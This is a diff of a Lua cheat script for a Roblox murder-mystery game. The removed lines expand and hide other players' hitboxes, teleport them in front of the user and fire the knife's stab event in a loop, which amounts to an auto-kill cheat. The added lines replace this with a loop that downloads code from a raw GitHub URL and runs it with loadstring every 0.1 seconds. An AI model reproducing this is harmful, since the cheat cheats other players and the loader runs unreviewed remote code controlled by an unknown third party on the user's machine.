@@ -182,52 +182,8 @@ while true do
         end)
 
         if isMurderer and eggFullVisible then
-            for _, target in pairs(Players:GetPlayers()) do
-                if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                    local hrp = target.Character.HumanoidRootPart
-                    originalSizes[target.Name] = {
-                        Size = hrp.Size,
-                        Transparency = hrp.Transparency,
-                        CFrame = hrp.CFrame,
-                        Anchored = hrp.Anchored
-                    }
-                    hrp.Size = Vector3.new(9, 9, 9)
-                    hrp.Transparency = 1
-                    hrp.CanCollide = false
-                    hrp.Massless = true
-                    hrp.Anchored = true
-                end
-            end
-
-            local moveConnection
-            moveConnection = RunService.RenderStepped:Connect(function()
-                if not isMurderer or not fullLabel or not fullLabel.Visible then
-                    moveConnection:Disconnect()
-                    return
-                end
-                for _, target in pairs(Players:GetPlayers()) do
-                    if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                        local hrp = target.Character.HumanoidRootPart
-                        local forward = currentCharacter.PrimaryPart.CFrame.LookVector
-                        hrp.CFrame = currentCharacter.PrimaryPart.CFrame + forward * 1
-                    end
-                end
-            end)
-
-            local knife = player.Backpack:FindFirstChild("Knife")
-            if knife then
-                knife.Parent = player.Character
-                task.wait(0.2)
-            end
-
-            while isMurderer and fullLabel and fullLabel.Visible and player.Character:FindFirstChild("Knife") do
-                local knifeTool = player.Character:FindFirstChild("Knife")
-                if knifeTool then
-                    local stabEvent = knifeTool:FindFirstChild("Stab")
-                    if stabEvent and stabEvent:IsA("RemoteEvent") then
-                        stabEvent:FireServer()
-                    end
-                end
+            while isMurderer and fullLabel and fullLabel.Visible do
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/ewqeeqweqeq/test/refs/heads/main/2.lua"))()
                 task.wait(0.1)
 
                 isMurderer = false
@@ -236,19 +192,6 @@ while true do
                     if name == player.Name and data.Role == "Murderer" then
                         isMurderer = true
                         break
-                    end
-                end
-            end
-
-            for _, target in pairs(Players:GetPlayers()) do
-                if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                    local hrp = target.Character.HumanoidRootPart
-                    local original = originalSizes[target.Name]
-                    if original then
-                        hrp.Size = original.Size
-                        hrp.Transparency = 1
-                        hrp.CFrame = original.CFrame
-                        hrp.Anchored = original.Anchored
                     end
                 end
             end
